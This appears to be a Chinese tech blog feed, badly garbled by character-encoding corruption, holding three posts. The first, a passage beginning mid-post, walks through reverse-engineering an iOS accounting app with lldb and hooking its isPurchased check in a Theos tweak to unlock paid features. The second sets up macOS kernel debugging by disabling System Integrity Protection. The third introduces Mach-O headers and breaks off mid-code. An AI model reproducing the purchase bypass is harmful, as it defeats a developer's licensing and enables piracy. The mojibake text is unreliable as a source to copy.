<p>æ‰¾åˆ°è¿™ä¸ªcycleSwitchï¼ŒçŒœæƒ³è¿™ä¸ªcycleSwitchåº”è¯¥æ¯”è¾ƒç‰¹æ®Šï¼Œå¯èƒ½æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œäºæ˜¯é€šè¿‡ä¹‹å‰æ‰“å°å‡ºæ¥çš„controlleræ¥å“åº”è¿™ä¸ªcycleSwitchï¼Œçœ‹çœ‹ç©¶ç«Ÿä¼šæ€æ ·</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/45C6EDA8-9524-40C6-AA3E-B30F13FF2595.png" alt="45C6EDA8-9524-40C6-AA3E-B30F13FF2595.png"></p>
<p>ç»“æœä¸å‡ºæ„æ–™ï¼Œåœ¨æ‰§è¡Œäº†<code>[#0x14d00820 cycleSwitch:YES]</code>ä¹‹åï¼Œæé†’è´­ä¹°çš„å¼¹æ¡†å¼¹äº†å‡ºæ¥ï¼Œè¿™å°±åˆæ­¥ç¡®å®šäº†æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°</p>
<p>å¹¶ä¸”ä¹Ÿç¡®å®šäº†<code>CatalogInfoViewController</code>è¿™ä¸ªcontrollerï¼Œåœ¨æ¥ä¸‹æ¥çš„æ“ä½œä¸­æˆ‘ä»¬å°†ä¼šç”¨åˆ°</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/0968E158-257D-4297-9079-4E791557F421.png" alt="0968E158-257D-4297-9079-4E791557F421.png"></p>
<h4 id="1-1-4-debugserver-lldbåŠ¨æ€è°ƒè¯•ç¡®è®¤å…³é”®å‡½æ•°"><a href="#1-1-4-debugserver-lldbåŠ¨æ€è°ƒè¯•ç¡®è®¤å…³é”®å‡½æ•°" class="headerlink" title="1.1.4 debugserver+lldbåŠ¨æ€è°ƒè¯•ç¡®è®¤å…³é”®å‡½æ•°"></a>1.1.4 debugserver+lldbåŠ¨æ€è°ƒè¯•ç¡®è®¤å…³é”®å‡½æ•°</h4><p>æ¥ä¸‹æ¥è¯¥æˆ‘ä»¬è¯¥ç¥­èµ·debugserverå’Œlldbäº†</p>
<blockquote>
<p>debugserverè¿è¡Œåœ¨iOSä¸Šï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒä½œä¸ºæœåŠ¡ç«¯ï¼Œå®é™…æ‰§è¡ŒLLDBï¼ˆä½œä¸ºå®¢æˆ·ç«¯ï¼‰ä¼ è¿‡æ¥çš„å‘½ä»¤ï¼Œå†æŠŠæ‰§è¡Œç»“æœåé¦ˆç»™LLDBï¼Œæ˜¾ç¤ºç»™ç”¨æˆ·ï¼Œå³æ‰€è°“çš„â€œè¿œç¨‹è°ƒè¯•â€ã€‚</p>
</blockquote>
<p><img src="http://oh5mz2415.bkt.clouddn.com/D107C0B6-4633-459D-8B45-9235708A3C43.png" alt="D107C0B6-4633-459D-8B45-9235708A3C43.png"></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/A5D1E3ED-594C-443C-B2B5-92CE6F6FF86D.png" alt="A5D1E3ED-594C-443C-B2B5-92CE6F6FF86D.png"></p>
<p>ç„¶åé€šè¿‡å‘½ä»¤<code>image list -o -f</code> æŸ¥çœ‹å®ƒçš„ASLRåç§» </p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/2B333515-BCE0-4FC8-90A8-669D05F9E078.png" alt="2B333515-BCE0-4FC8-90A8-669D05F9E078.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå®ƒçš„ASLRåç§»ä¸º<code>0x0003c000</code></p>
<p>ç´§æ¥ç€æˆ‘ä»¬æŠŠä¹‹å‰ç ¸å£³çš„æ–‡ä»¶æ‹–è¿›hopperæˆ–idaï¼Œæœç´¢å‰é¢å¾—åˆ°çš„<code>CatalogInfoViewController</code> ï¼Œå¤§è‡´æµè§ˆä¸€éï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª<code>[CatalogInfoViewController cycleSwitch]</code>è¿™å’Œæˆ‘ä»¬ä¹‹å‰çš„çŒœæƒ³ä¸è°‹è€Œåˆ</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/33975B1D-E93E-4299-BC26-2A7CAB3E91C6.png" alt="33975B1D-E93E-4299-BC26-2A7CAB3E91C6.png"></p>
<p>è¿™æ—¶å€™ä¸‹é¢çš„ä¸€ä¸ª<code>isPurchased</code> ï¼ˆè´­ä¹°ï¼‰å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼Œæˆ‘æƒ³è¦çœ‹çœ‹è¿™ä¸ªisPurchasedåˆ°åº•åšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œç©¶ç«Ÿæ˜¯ä¸æ˜¯æˆ‘ä»¬çŒœæƒ³çš„é‚£æ ·ï¼Œäºæ˜¯åœ¨å‡½æ•°å¼€å§‹æ—¶(0x0004fdf0)æ‰“æ–­ç‚¹,ç”±äºä¹‹å‰çœ‹åˆ°ASLRåç§»ä¸º0x0003c000ï¼Œæ‰€ä»¥è¦æŠŠä»–ä»¬ç›¸åŠ æ‰æ˜¯å‡½æ•°åç§»åçš„åœ°å€</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/ECAB072D-B5A4-49C6-AB59-BCA32DB944D0.png" alt="ECAB072D-B5A4-49C6-AB59-BCA32DB944D0.png"></p>
<p>è¿›å…¥åˆ°å‡½æ•°ä¸­åï¼Œä¸€ç›´ä½¿ç”¨<code>ni</code>å‘½ä»¤ï¼Œç›´åˆ°å‡½æ•°åˆ°è¿™é‡Œ </p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/A9D9E77F-064B-412F-AC02-0B51AB3C0FC2.png" alt="A9D9E77F-064B-412F-AC02-0B51AB3C0FC2.png"></p>
<p>æ‰“å°r0,å‘ç°å‚æ•°ä¸ºnilï¼Œæˆ‘ä»¬æ¥å°è¯•ç€æŠŠr0çš„å€¼æ”¹ä¸º1ï¼Œç„¶åæˆ‘ä»¬å‘ç°è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„æ‰€è°“â€œå‘¨æœŸè®°è´¦â€çš„é«˜çº§åŠŸèƒ½äº†ï¼Œå½“ç„¶è¿™è¿˜æ²¡å®Œï¼Œç°åœ¨è¿™é‡Œåªæ˜¯ç¡®å®šç›®æ ‡å‡½æ•°ä»¥åŠå‚æ•°ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¼€å§‹æœ€å…³é”®ä¹Ÿæœ€å¿…ä¸å¯å°‘çš„ä¸€æ­¥ï¼Œå°±æ˜¯ç”¨theosæ¥ç¼–å†™tweak </p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/1506AF86-8E46-4436-9969-08F0A8432331.png" alt="1506AF86-8E46-4436-9969-08F0A8432331.png"></p>
<h3 id="1-2ç¼–å†™tweak"><a href="#1-2ç¼–å†™tweak" class="headerlink" title="1.2ç¼–å†™tweak"></a>1.2ç¼–å†™tweak</h3><p>æˆ‘ä»¬é¦–å…ˆåœ¨å¯¼å‡ºçš„å¤´æ–‡ä»¶ä¸­æŸ¥æ‰¾isPurchasedï¼Œæ‰¾åˆ°Purchased.hæ–‡ä»¶</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/BBC752AF-F902-48FD-8911-290F35A0A589.png" alt="BBC752AF-F902-48FD-8911-290F35A0A589.png"></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/0294818F-275B-43E2-ABA8-D8CA789D0754.png" alt="0294818F-275B-43E2-ABA8-D8CA789D0754.png"></p>
<p>ç„¶åæˆ‘ä»¬çœ‹åˆ°@property(nonatomic,getter=isPurchased,setter=setPurchased:) BOOL purchased,æˆ‘ä»¬æŠŠè¿™ä¸ªpurchasedæ°¸ä¹…è¿”å›1ï¼Œåº”è¯¥å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„ä»»åŠ¡äº†ã€‚</p>
<p>ç»§ç»­ï¼Œæ–°å»ºå·¥ç¨‹ï¼Œç¼–è¾‘makefil</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161118-1@2x.png" alt="QQ20161118-1@2x.png"></p>
<p>ç„¶åç»§ç»­ç¼–è¾‘tweak</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161118-2@2x.png" alt="QQ20161118-2@2x.png"></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161118-3@2x.png" alt="QQ20161118-3@2x.png"></p>
<p>æ‰“åŒ…ç¼–è¯‘å®‰è£…åˆ°è¶Šç‹±æ‰‹æœºï¼Œå°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ‰€è°“çš„é«˜çº§åŠŸèƒ½äº†ã€‚</p>
<h3 id="2-0å…³äºé˜²æŠ¤æªæ–½æ‚è°ˆ"><a href="#2-0å…³äºé˜²æŠ¤æªæ–½æ‚è°ˆ" class="headerlink" title="2.0å…³äºé˜²æŠ¤æªæ–½æ‚è°ˆ"></a>2.0å…³äºé˜²æŠ¤æªæ–½æ‚è°ˆ</h3><p>ä¿—è¯è¯´å¾—å¥½ï¼Œæœ‰æ”»å°±æœ‰é˜²ï¼Œioså®‰å…¨é˜²æŠ¤æªæ–½è™½è¯´æ²¡æœ‰å®‰å“è¿™ä¹ˆå¤šï¼Œä½†ä¹Ÿæœ‰é€æ¸å‘å±•çš„è¶‹åŠ¿ï¼Œå°å¼Ÿè§‰å¾—é¦–å…ˆä¸€ä¸ªåŸå› å¯èƒ½æ˜¯å›½å†…ä»£ç æ··æ·†æŠ€æœ¯æ²¡æœ‰æ™®åŠï¼Œè€Œä¸”å¤§å¤šæ•°appä¹Ÿåªæœ‰æ ¸å¿ƒåŠŸèƒ½æ‰ä¼šè¢«æ··æ·†ï¼Œä¸ç„¶å…¨æ–‡æ··æ·†çš„è¯è¿è¡Œè¿‡ç¨‹ä¸­çš„å†…å­˜åŠ è§£å¯†ä¹Ÿæ˜¯å¾ˆå¤§çš„å¼€é”€ã€‚</p>
<p>å…³äºé˜²æŠ¤æªæ–½ï¼Œè¾ƒä¸ºæ™®éçš„å°±æ˜¯å¼•å…¥åŠ¨æ€é˜²æŠ¤ç»„ä»¶ï¼Œä¸ªäººè§‰å¾—xç»´å®‰å…¨ç›¸å¯¹åšçš„è¿˜ä¸é”™ï¼Œå°±ç›®å‰æ¥è¯´ç»å¤§å¤šæ•°appè¿åŸºæœ¬çš„åè°ƒè¯•åŠŸèƒ½éƒ½æ²¡æœ‰ï¼Œå¼•å…¥åŠ¨æ€é˜²æŠ¤ç»„ä»¶ï¼Œå¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢åŠ¨æ€æ³¨å…¥ã€åŠ¨æ€è°ƒè¯•ï¼Œæ–¹æ³•åç±»åæ··æ·†ç­‰ï¼Œè¿˜æœ‰å…³äºllvmçš„ä¸€äº›ä¸œè¥¿ï¼Œå¦‚åœ¨IRå±‚å®ç°ä¸€äº›æ··æ·†é€»è¾‘ï¼ŒåŠ å…¥å„ç§è·³è½¬å„ç§æ— ç”¨é€»è¾‘ä½†åˆä¸ä¼šå½±å“åŸæœ‰çš„ç¨‹åºé€»è¾‘ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ<a href="https://github.com/obfuscator-llvm/obfuscator/" target="_blank" rel="external">https://github.com/obfuscator-llvm/obfuscator/</a>ï¼Œä¸è¿‡æŒºä¹…æ²¡ç»´æŠ¤äº†éœ€è¦è‡ªå·±å¤§åŠ¨å¹²æˆˆæŠ˜è…¾ä¸€ç•ªï¼Œå¯¹ä¸ªäººèƒ½åŠ›è¦æ±‚è¾ƒé«˜ï¼Œè€Œä¸”IRå±‚çš„æ··æ·†æœ¬èº«é—®é¢˜è¾ƒå¤šå¯èƒ½ä½¿appå­˜åœ¨å¾ˆå¤šæ½œåœ¨çš„bugï¼Œå¹¶ä¸”åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥è¢«è¿˜åŸï¼Œæ‰€ä»¥åªè¦èƒ½åšåˆ°ä»¥ä¸Šçš„ä¸€äº›ï¼Œå¯ä»¥é˜²æ­¢æ–°æ‰‹é€†å‘ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå·²ç»æŠŠå¾ˆå¤šäººæŒ¡åœ¨äº†å¤–é¢ã€‚psï¼šé»‘ç°äº§æœ‹å‹åº”è¯¥æ„Ÿè°¢å¾®ä¿¡æ²¡åšé˜²æŠ¤æªæ–½ã€‚</p>
<p>é™¤äº†è¿™äº›å½“ç„¶è¿˜æœ‰å…¶ä»–æ–¹é¢çš„é˜²æŠ¤æªæ–½ï¼Œéšç€è®¡ç®—æœºçš„å‘å±•å®‰å…¨ä¹Ÿä¼šè¶Šæ¥è¶Šè¢«é‡è§†ï¼Œå¯¹iosé€†å‘æ„Ÿå…´è¶£æ¨è@å¤§åç‹—å‰©çš„ã€Šiosåº”ç”¨é€†å‘å·¥ç¨‹ã€‹ä»¥åŠè®ºå›bbs.iosre.comï¼Œæ¬¢è¿å‰æ¥äº¤æµã€‚</p>
<p><strong>å°ç»“</strong>ï¼šæœ¬æ–‡ä¸ºè¿™æ¬¾è®°è´¦è½¯ä»¶åˆ¶ä½œäº†å»é™¤é«˜çº§åŠŸèƒ½é™åˆ¶æ’ä»¶ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ›´å…¨é¢çš„ä½¿ç”¨è¿™æ¬¾appï¼Œè™½ç„¶æœ€åçš„ä»£ç åªæœ‰å‡ è¡Œï¼Œä½†æ•´ä¸ªåˆ†æè¿‡ç¨‹å´æ˜¯ä¸€ç¯æ‰£ä¸€ç¯ï¼Œå“ªæ€•å…¶ä¸­ä¸€ç¯å‡ºé”™ä¸æ³¨æ„å°±ä¼šè¢«è¯¯å¯¼ï¼Œé€†å‘è¿™æ¬¾appè™½ç„¶è¯´æŒºç®€å•çš„ï¼Œä½†ä¸»è¦æ€è·¯å·®ä¸å¤šéƒ½æ˜¯è¿™æ ·ï¼Œå¸Œæœ›èƒ½ä¸ºæ­£åœ¨å­¦ä¹ å¹¶ä¸”è‡ªå·±å¯¹å¿ƒä»ªçš„appæ— ä»ä¸‹æ‰‹çš„æœ‹å‹æä¾›ä¸€äº›å¸®åŠ©ã€‚</p>
<p>æœ‰äº›æœ‹å‹è§‰å¾—æœ¬æ–‡è¿æ°”æˆåˆ†å¾ˆå¤§ï¼Œæ²¡é”™ï¼Œé€†å‘å·¥ç¨‹ä¸æ¯”appå¼€å‘ï¼Œæ²¡æœ‰å®˜æ–¹æ–‡æ¡£ä½œä¸ºå‚è€ƒï¼Œæœ€æœ‰æ•ˆçš„æ–¹å¼å°±æ˜¯ä¸æ–­å°è¯•ï¼Œä¸æ–­çŠ¯é”™ï¼Œå†ä¸æ–­æ”¹è¿›ï¼Œæˆ‘ä»¬é¢å¯¹çš„æ€»æ˜¯ä¸€äº›æœªçŸ¥çš„ä¸œè¥¿ï¼Œæˆ–è®¸ä½ ç¦»æˆåŠŸåªå·®ä¸€æ­¥ï¼Œä½†å´å› ä¸ºçœ‹ä¸åˆ°å‰æ–¹ï¼Œè€Œèµ°å‘ä¸€æ¡æ›´å›°éš¾çš„è·¯ï¼Œæˆ‘ä»¬åœ¨è®¡ç®—æœºçš„è¡Œä¸šé‡Œåªæœ‰ä¸æ–­æ¢ç´¢ï¼Œæ‰æœ‰å¯èƒ½é€æ¸è¶…è¶Šè‡ªæˆ‘ï¼Œå°å¼Ÿä¹Ÿæ˜¯åˆå­¦é€†å‘ï¼Œå¯¹è‡ªå·±è¯´ä¹Ÿå¯¹è·¯ä¸Šçš„æœ‹å‹è¯´ï¼Œæ„¿æˆ‘ä»¬åœ¨æ¢ç´¢çš„é“è·¯ä¸Šä¸€ç›´å‹‡æ•¢ä¸‹å»ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> iOS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OSXå†…æ ¸è°ƒè¯•]]></title>
      <url>http://Hello-Sherlock.github.io/2016/12/15/four-Blog/</url>
      <content type="html"><![CDATA[<h2 id="æ­å»ºOSXè°ƒè¯•ç¯å¢ƒ"><a href="#æ­å»ºOSXè°ƒè¯•ç¯å¢ƒ" class="headerlink" title="æ­å»ºOSXè°ƒè¯•ç¯å¢ƒ"></a>æ­å»ºOSXè°ƒè¯•ç¯å¢ƒ</h2><ol>
<li>VMware8.5.1</li>
<li>Kernel_Debug_Kit10.11.4build_15E65</li>
<li>Install El Capitan 10.11.4 (15E65)</li>
</ol>
<a id="more"></a>
<p>è¿™é‡Œç°åœ¨Macä¸Šå®‰è£…VMï¼Œåœ¨è£…è™šæ‹Ÿæœºçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸ªå‘ï¼Œå› ä¸ºæ˜¯8.xçš„VMï¼Œæ‰€ä»¥è¿è¡ŒOSXç³»ç»Ÿæ—¶ä¼šå‡ºç°<code>ä¸vmmonæ¨¡å—çš„ç‰ˆæœ¬ä¸åŒ¹é…ï¼Œéœ€è¦308.0ï¼Œç°æœ‰304.0</code> ï¼Œç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ–¹æ³•ä¹Ÿæ²¡åŠæ³•è§£å†³ï¼Œæœ€åé‡å¯äº†ä¸€éç”µè„‘ç«Ÿç„¶å¯ä»¥äº†ã€‚</p>
<p>ç´§æ¥ç€å°±æ˜¯åœ¨æœ¬æœºå’Œè™šæ‹Ÿæœºä¸­å®‰è£…KDK</p>
<blockquote>
<p><strong>Kernel Debug Kitæ˜¯è‹¹æœå®˜æ–¹æä¾›çš„è°ƒè¯•å·¥å…·åŒ…,æ¯ä¸€ä¸ªæ­£å¼çš„ç³»ç»Ÿä¸­éƒ½ä¼šæœ‰å¯¹åº”çš„KDK,ä¸‹è½½åœ°å€åœ¨<a href="https://developer.apple.com/downloads/" target="_blank" rel="external">è¿™é‡Œ</a></strong></p>
</blockquote>
<p>ä¸‹è½½äº†å¯¹åº”ç‰ˆæœ¬çš„kdkåï¼Œåœ¨è™šæ‹Ÿæœºä¸­å’Œæœ¬æœºä¸­éƒ½è¦å®‰è£…è¿™ä¸ªKDKï¼Œå®‰è£…åçš„ç›®å½•åœ¨<code>/Library/Developer/KDKs/Kernel_Debug_Kit_10.11.4_build_15E65</code>ä¸­</p>
<p>åœ¨OSXä¸­ï¼Œå†…æ ¸çš„å¯æ‰§è¡Œæ–‡ä»¶ä½äº<code>/Systems/Library/Kernels</code>ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨KDKå®‰è£…ç›®å½•çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸‹æ‰¾åˆ°<code>kernel.development</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¤åˆ¶åˆ°<code>/Systems/Library/Kernels</code> å³å¯ï¼Œä½†æ˜¯OSXä½¿ç”¨äº† <strong>â€œrootlessâ€</strong> çš„æœºåˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯èƒ½æ— æ³•å¤åˆ¶ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦å…³é—­ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤æœºåˆ¶ï¼Œå¦‚ä½•åšå‘¢ï¼Ÿæˆ‘ä»¬é¦–å…ˆè¦åœ¨è™šæ‹Ÿæœºä¸­é‡å¯ï¼Œç„¶åç«‹å³æŒ‰ä½<code>option+command+R</code>ï¼Œç›´åˆ°å‡ºç°ğŸŒåœ°çƒï¼Œç„¶åæˆ‘ä»¬é¡¶éƒ¨æ‰¾åˆ°ç»ˆç«¯ï¼Œæ‰“å¼€åè¾“å…¥<code>csrutil disable</code>ï¼Œå³å¯å…³é—­ï¼Œç„¶åå†é‡å¯ï¼Œå°±å¯ä»¥å¤åˆ¶äº†ã€‚</p>
<p>å¤åˆ¶åæˆ‘ä»¬è¦è®¾ç½®ç³»ç»Ÿè°ƒè¯•å‚æ•°:</p>
<p><code>sudo nvram boot-args=&quot;debug=0x141 kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot;</code></p>
<p>å…³äºè¿™äº›å‚æ•°</p>
<ol>
<li><code>debug=0x141</code>å¯ç”¨äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼</li>
<li><code>kext-dev-mode=1</code>å¯ä»¥ç”¨æ¥åŠ è½½æœªç­¾åçš„kextæ–‡ä»¶ï¼ˆkextæ–‡ä»¶ï¼šMac OSXçš„å†…æ ¸æ‰©å±•ï¼Œé€šå¸¸ç”¨äºè®¾å¤‡é©±åŠ¨ç¨‹åºï¼‰</li>
<li><code>kcsuffix=development</code>æˆ‘ä»¬ä¹‹å‰å¤åˆ¶çš„æ˜¯kernel.developmentæ–‡ä»¶ï¼Œè¿™é‡Œå…è®¸æˆ‘ä»¬æ ¹æ®è¿™ä¸ªæ–‡ä»¶è¿›è¡Œå¼•å¯¼å†…æ ¸å‘å±•</li>
<li><code>pmuflags=1</code>ç¦æ­¢çœ‹é—¨ç‹—å®šæ—¶å™¨</li>
<li><code>-v</code> å†…æ ¸è°ƒè¯•çš„æ—¶å€™ä¼šæœ‰ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯</li>
</ol>
<p>è¿™æ—¶æˆ‘ä»¬å°±è¦çœ‹çœ‹è™šæ‹Ÿæœºç½‘ç»œé…ç½®ä»¥è‡³äºæ¥ä¸‹æ¥è¿œç¨‹è¿æ¥åˆ°å®ƒ</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/B5C02EBEC1AE2212BD1996E2FFE4F98C.jpg" alt="B5C02EBEC1AE2212BD1996E2FFE4F98C"></p>
<p>è¿™é‡ŒMacåœ°å€<code>00:0c:29:1b:7d:f0</code> å’ŒIPåœ°å€<code>192.168.174.129</code>æ˜¯è¦è®°ä½çš„</p>
<p>ç”±äºæˆ‘ä»¬è¦è¿›è¡Œæ–°çš„å†…æ ¸è°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®¾ç½®kextç¼“å­˜ä¸ºæ— æ•ˆ</p>
<p><code>sudo kextcache -invalidate</code></p>
<h2 id="è¿›è¡Œå†…æ ¸è°ƒè¯•"><a href="#è¿›è¡Œå†…æ ¸è°ƒè¯•" class="headerlink" title="è¿›è¡Œå†…æ ¸è°ƒè¯•"></a>è¿›è¡Œå†…æ ¸è°ƒè¯•</h2><p>æˆ‘ä»¬é¦–å…ˆåœ¨è™šæ‹Ÿæœºä¸Šå¯åŠ¨lldb</p>
<p>ç„¶ååˆ›å»ºå†…æ ¸è°ƒè¯•ä»»åŠ¡</p>
<p><code>target create /Library/Developer/KDKs/KDK_10.11.4_15E65.kdk/System/Library/Kernels/kernel.development</code></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/09ED67D25ECEA5C31E9BA548ECBE74EE.jpg" alt="09ED67D25ECEA5C31E9BA548ECBE74EE"></p>
<p>ç„¶åæˆ‘ä»¬é‡å¯è™šæ‹Ÿæœºï¼Œç­‰å¼€æœºä¼šå°±ä¼šçœ‹åˆ°æç¤ºè¿œç¨‹è¿æ¥çš„ä¿¡æ¯</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161215-3@2x.jpg" alt="QQ20161215-3@2x"></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¼€å§‹åœ¨ä¸»æœºä¸Šè¿œç¨‹è¿æ¥äº†ï¼Œè¿˜è®°å¾—ä¹‹å‰æˆ‘ä»¬è¦è®°ä½çš„macåœ°å€å’Œipåœ°å€å—ï¼Ÿ</p>
<p>æˆ‘ä»¬åœ¨ä¸»æœºä¸Šå¯åŠ¨lldb</p>
<p><code>kdp-remote 192.168.174.129</code></p>
<p>lldbæ§åˆ¶å°ä¼šè¾“å‡ºä¸€äº›ä¿¡æ¯å¹¶ä¸”åœ¨è™šæ‹Ÿæœºä¸­ä¹Ÿä¼šå‡ºç°<code>Connected to remote debugger</code>ï¼Œè¿™æ ·å°±è¿œç¨‹è¿æ¥åˆ°äº†è™šæ‹Ÿæœº</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161215-5@2x.jpg" alt="QQ20161215-5@2x"><br><img src="http://oh5mz2415.bkt.clouddn.com/QQ20161215-6@2x.jpg" alt="QQ20161215-6@2x"></p>
<p>åˆ°è¿™é‡Œï¼ŒåŸºæœ¬ä¸Šå®Œæˆäº†å†…æ ¸è°ƒè¯•çš„åŸºç¡€æ­¥éª¤ï¼Œç„¶åå°±è¿›è¡Œå’Œå¹³æ—¶é€šè¿‡lldbä¸€æ ·çš„æ“ä½œäº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œå¤§å®¶å¯ä»¥ä¸‹æ¥è‡ªå·±æŒ‰ç…§æ„æ„¿æ¥è°ƒè¯•ã€‚</p>
<blockquote>
<p><strong>å‚è€ƒï¼š<a href="http://ddeville.me/2015/08/kernel-debugging-with-lldb-and-vmware-fusion" target="_blank" rel="external">http://ddeville.me/2015/08/kernel-debugging-with-lldb-and-vmware-fusion</a></strong></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> OSX </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mach-Oæ–‡ä»¶æ ¼å¼]]></title>
      <url>http://Hello-Sherlock.github.io/2016/12/06/three-Blog/</url>
      <content type="html"><![CDATA[<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘ä»¬ç”¨Xcodeæ„å»ºä¸€ä¸ªç¨‹åºè¿‡ç¨‹ä¸­ï¼Œä¼šæŠŠæºæ–‡ä»¶è½¬æ¢æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­åŒ…å«çš„å­—èŠ‚ç ä¼šè¢«CPUæ‰§è¡Œã€‚<br>å°±åƒWindowsä¸Šçš„PEå’ŒLinuxä¸Šçš„ELFï¼ŒOS Xç³»ç»Ÿå¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼ä¸ºMach-Oï¼Œæ¥ä¸‹æ¥ç®€å•è°ˆè°ˆMach-Oã€‚</p>
<p>å…ˆæ¥çœ‹çœ‹è‹¹æœå®˜æ–¹æ–‡æ¡£å¯¹Mach-Oç»“æ„ç»„æˆçš„æè¿°<br><a id="more"></a></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/794D3F35-0A43-45E0-9EA4-CA2637954096.png" alt="794D3F35-0A43-45E0-9EA4-CA2637954096"></p>
<p>ç”±å›¾å¯çŸ¥ï¼ŒMach-Oä¸»è¦åˆ†ä¸º3å¤§éƒ¨åˆ†ï¼š<br>1.Header:ç”¨äºå¿«é€Ÿç¡®è®¤ä¸€äº›å…³äºå½“å‰æ–‡ä»¶å¯¹åº”çš„å¤„ç†å™¨ï¼Œæ–‡ä»¶ç±»å‹ï¼ŒLoad connamdä¸ªæ•°åŸºæœ¬ä¿¡æ¯<br>2.Load commands:ç´§è·Ÿåœ¨Headerä¹‹åï¼Œç”¨äºå‘Šè¯‰åŠ è½½å™¨æ€æ ·å¤„ç†äºŒè¿›åˆ¶æ•°æ®<br>3.Data:åŒ…å«Segmentä¸­çš„å…·ä½“ä¿¡æ¯</p>
<h3 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h3><p>headersçš„å®šä¹‰åœ¨å¼€æºå†…æ ¸ä»£ç ä¸­å¯ä»¥æ‰¾åˆ°(/usr/include/mach-o/loader.h)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> mach_header &#123;</div><div class="line"><span class="keyword">uint32_t</span> magic; <span class="comment">/* mach magic number identifier */</span></div><div class="line"><span class="keyword">cpu_type_t</span> cputype; <span class="comment">/* cpu specifier */</span></div><div class="line"><span class="keyword">cpu_subtype_t</span> cpusubtype; <span class="comment">/* machine specifier */</span></div><div class="line"><span class="keyword">uint32_t</span> filetype; <span class="comment">/* type of file */</span></div><div class="line"><span class="keyword">uint32_t</span> ncmds; <span class="comment">/* number of load commands */</span></div><div class="line"><span class="keyword">uint32_t</span> sizeofcmds; <span class="comment">/* the size of all the load commands */</span></div><div class="line"><span class="keyword">uint32_t</span> flags; <span class="comment">/* flags */</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">/* Constant for the magic field of the mach_header (32-bit architectures) */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_MAGIC 0xfeedface <span class="comment">/* the mach magic number */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_CIGAM 0xcefaedfe <span class="comment">/* NXSwapInt(MH_MAGIC) */</span></span></div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * The 64-bit mach header appears at the very beginning of object files for</div><div class="line"> * 64-bit architectures.</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> mach_header_64 &#123;</div><div class="line"><span class="keyword">uint32_t</span> magic; <span class="comment">/* mach magic number identifier */</span></div><div class="line"><span class="keyword">cpu_type_t</span> cputype; 